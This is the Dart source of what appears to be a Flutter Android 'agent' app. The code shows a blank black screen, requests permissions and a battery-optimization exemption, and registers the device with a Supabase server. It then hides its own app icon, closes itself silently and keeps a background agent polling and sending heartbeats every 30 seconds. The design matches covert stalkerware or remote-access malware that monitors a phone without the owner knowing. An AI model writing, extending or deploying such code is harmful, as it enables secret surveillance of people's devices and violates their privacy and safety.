// lib/main.dart - REFACTORED: READ-ONLY mode
import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'core/device_agent.dart';
import 'core/device_id.dart';
import 'app_logger.dart';

const String SUPABASE_URL = 'https://kywpnhaermwldzcwtsnv.supabase.co';
const int HEARTBEAT_INTERVAL_SECONDS = 30;

const MethodChannel _permChannel = MethodChannel('cyber_agent/permissions');
const MethodChannel _batteryChannel = MethodChannel('cyber_agent/battery');
const MethodChannel _appHider = MethodChannel('cyber_accessibility_agent/app_hider');

const String _prefSetupDone = 'setup_done';
const String _prefBatteryAsked = 'battery_asked';
const String _prefAgentRegistered = 'agent_registered';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  await AppLogger.init();
  AppLogger.logLifecycle('App starting');
  
  runApp(const MediaAgentApp());
}

class MediaAgentApp extends StatelessWidget {
  const MediaAgentApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: SilentSetupPage(),
    );
  }
}

class SilentSetupPage extends StatefulWidget {
  const SilentSetupPage({super.key});

  @override
  State<SilentSetupPage> createState() => _SilentSetupPageState();
}

class _SilentSetupPageState extends State<SilentSetupPage> {
  bool _agentStarted = false;

  Timer? _heartbeatTimer;

  @override
  void initState() {
    super.initState();
    AppLogger.logLifecycle('SilentSetupPage.initState');
    _silentInit();
  }

  @override
  void dispose() {
    AppLogger.logLifecycle('SilentSetupPage.dispose');
    _heartbeatTimer?.cancel();
    super.dispose();
  }

  Future<void> _silentInit() async {
    AppLogger.logLifecycle('_silentInit() called');
    
    try {
      final prefs = await SharedPreferences.getInstance();
      final setupDone = prefs.getBool(_prefSetupDone) ?? false;

      AppLogger.d('Setup', 'setupDone: $setupDone');

      if (setupDone) {
        AppLogger.i('Setup', 'Setup already done - starting agent if needed');
        
        // ✅ Check if agent already registered
        final agentRegistered = prefs.getBool(_prefAgentRegistered) ?? false;
        
        if (!agentRegistered) {
          AppLogger.i('Setup', 'Agent not yet registered - completing background registration');
          await _startAgentInBackground();
        } else {
          AppLogger.d('Setup', 'Agent already registered - skipping');
        }
        
        _closeAppSilently();
        return;
      }

      // ✅ First run - request battery optimization
      AppLogger.i('Setup', 'First run - starting setup flow');
      await _handleBatteryOptimization();

      // ✅ Request READ-ONLY permissions
      try {
        AppLogger.d('Setup', 'Requesting READ permissions...');
        await _permChannel.invokeMethod('requestPermissions');
        
        // ✅ After permission dialog, MainActivity will:
        // 1. Start agent service (if granted)
        // 2. Close itself immediately
        // 3. Background registration continues in AgentService
        
        AppLogger.i('Setup', 'Permission request sent - MainActivity will handle rest');
        
      } catch (e, st) {
        AppLogger.e('Setup', 'Permission request failed', e, st);
        
        // ✅ Even if permission request fails, mark setup as done
        await prefs.setBool(_prefSetupDone, true);
        _closeAppSilently();
      }
      
    } catch (e, st) {
      AppLogger.e('Setup', '_silentInit failed', e, st);
    }
  }

  Future<void> _handleBatteryOptimization() async {
    AppLogger.d('Battery', 'handleBatteryOptimization() called');
    
    try {
      final prefs = await SharedPreferences.getInstance();
      final alreadyAsked = prefs.getBool(_prefBatteryAsked) ?? false;
      
      if (alreadyAsked) {
        AppLogger.d('Battery', 'Already asked - skipping');
        return;
      }

      final bool ignoring = await _batteryChannel.invokeMethod('isIgnoringBatteryOptimizations') == true;
      AppLogger.i('Battery', 'isIgnoring: $ignoring');

      if (!ignoring) {
        AppLogger.i('Battery', 'Requesting battery optimization exemption');
        try {
          await _batteryChannel.invokeMethod('requestIgnoreBatteryOptimizations');
        } catch (e, st) {
          AppLogger.e('Battery', 'Request failed', e, st);
        }
      }

      await prefs.setBool(_prefBatteryAsked, true);
      AppLogger.d('Battery', 'Marked as asked');
      
    } catch (e, st) {
      AppLogger.e('Battery', 'handleBatteryOptimization failed', e, st);
      try {
        final prefs = await SharedPreferences.getInstance();
        await prefs.setBool(_prefBatteryAsked, true);
      } catch (_) {}
    }
  }

  /// ✅ Start agent registration in background (independent of Activity)
  Future<void> _startAgentInBackground() async {
    AppLogger.d('Agent', '_startAgentInBackground() called');
    
    if (_agentStarted) {
      AppLogger.d('Agent', 'Already started - skipping');
      return;
    }
    
    _agentStarted = true;

    try {
      final deviceId = await DeviceId.getOrCreate();
      AppLogger.i('Agent', 'Device ID: $deviceId');

      await DeviceAgent.instance.configure(
        supabaseUrl: SUPABASE_URL,
        deviceId: deviceId,
      );
      AppLogger.i('Agent', 'Agent configured');

      await DeviceAgent.instance.register();
      AppLogger.i('Agent', 'Device registered');

      // ✅ Mark as registered
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool(_prefAgentRegistered, true);
      await prefs.setBool(_prefSetupDone, true);
      AppLogger.d('Agent', 'Setup and registration marked complete');

      // ✅ Hide app icon
      try {
        await _appHider.invokeMethod('hide');
        AppLogger.i('Agent', 'App icon hidden');
      } catch (e, st) {
        AppLogger.e('Agent', 'App hide failed', e, st);
      }

      _heartbeatTimer?.cancel();
      _heartbeatTimer = Timer.periodic(
        const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS),
        (_) {
          AppLogger.d('Agent', 'Sending heartbeat');
          DeviceAgent.instance.heartbeat();
        },
      );
      
      AppLogger.i('Agent', '✅ Agent started successfully in background');
      
    } catch (e, st) {
      AppLogger.e('Agent', '❌ Agent start failed', e, st);
      _agentStarted = false;
    }
  }

  void _closeAppSilently() {
    AppLogger.logLifecycle('Closing app silently');
    try {
      SystemNavigator.pop(animated: true);
    } catch (e, st) {
      AppLogger.e('Setup', 'SystemNavigator.pop failed', e, st);
      if (Platform.isAndroid) {
        exit(0);
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      backgroundColor: Colors.black,
      body: SizedBox.expand(),
    );
  }
}

/// ✅ Background entrypoint for AgentService
/// This runs independently of MainActivity
@pragma('vm:entry-point')
void backgroundMain() {
  WidgetsFlutterBinding.ensureInitialized();
  
  AppLogger.init().then((_) {
    AppLogger.logLifecycle('backgroundMain() started');
    _startBackgroundAgent();
  });
}

/// Start agent in background (called from AgentService)
Future<void> _startBackgroundAgent() async {
  try {
    final prefs = await SharedPreferences.getInstance();
    final agentRegistered = prefs.getBool(_prefAgentRegistered) ?? false;
    
    if (agentRegistered) {
      AppLogger.d('Background', 'Agent already registered - starting polling');
      
      final deviceId = await DeviceId.getOrCreate();
      
      await DeviceAgent.instance.configure(
        supabaseUrl: SUPABASE_URL,
        deviceId: deviceId,
      );
      
      await DeviceAgent.instance.start();
      AppLogger.i('Background', '✅ Agent polling started');
      
    } else {
      AppLogger.i('Background', 'Completing initial registration...');
      
      final deviceId = await DeviceId.getOrCreate();
      
      await DeviceAgent.instance.configure(
        supabaseUrl: SUPABASE_URL,
        deviceId: deviceId,
      );
      
      await DeviceAgent.instance.register();
      await prefs.setBool(_prefAgentRegistered, true);
      AppLogger.i('Background', '✅ Registration complete');
      
      await DeviceAgent.instance.start();
      AppLogger.i('Background', '✅ Agent started');
    }
    
  } catch (e, st) {
    AppLogger.e('Background', 'Failed to start background agent', e, st);
  }
}
